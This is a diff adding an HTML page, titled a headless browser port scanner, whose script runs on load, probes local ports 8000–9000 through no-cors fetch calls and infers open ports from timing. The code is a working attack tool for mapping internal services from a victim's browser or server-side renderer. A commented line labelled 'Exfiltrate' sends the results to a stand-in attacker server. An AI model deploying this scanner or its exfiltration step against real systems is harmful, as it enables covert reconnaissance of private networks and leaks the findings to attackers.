@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Headless Browser Port Scanner</title>
+</head>
+<body>
+    <h3>Scanning 127.0.0.1 (Ports 8000-9000)...</h3>
+    <ul id="results"></ul>
+
+    <script>
+        const resultsList = document.getElementById('results');
+        const target = "127.0.0.1";
+        const startPort = 8000;
+        const endPort = 9000;
+
+        async function checkPort(port) {
+            const start = performance.now();
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 1000); // 1s timeout
+
+            try {
+                // We use 'fetch' with 'no-cors' to attempt a connection
+                await fetch(`http://${target}:${port}`, { mode: 'no-cors', signal: controller.signal });
+                logResult(port, "Open (Fetched)", "green");
+            } catch (err) {
+                const duration = performance.now() - start;
+                if (err.name === 'AbortError') {
+                    logResult(port, "Filtered/Open (Timeout)", "orange");
+                } else if (duration > 50) { 
+                    // If it took a bit of time to fail, it might be open but rejecting HTTP
+                    logResult(port, "Potentially Open (Reset)", "blue");
+                }
+                // Closed ports usually fail in < 10ms
+            } finally {
+                clearTimeout(timeoutId);
+            }
+        }
+
+        function logResult(port, status, color) {
+            const li = document.createElement('li');
+            li.style.color = color;
+            li.textContent = `Port ${port}: ${status}`;
+            resultsList.appendChild(li);
+            
+            // Exfiltrate: In a real hunt, you'd send this back to your server
+            // fetch(`https://your-attacker-server.com/log?port=${port}&status=${status}`);
+        }
+
+        async function runScanner() {
+            for (let port = startPort; port <= endPort; port++) {
+                await checkPort(port);
+            }
+            logResult("DONE", "Scan Complete", "black");
+        }
+
+        runScanner();
+    </script>
+</body>
+</html>
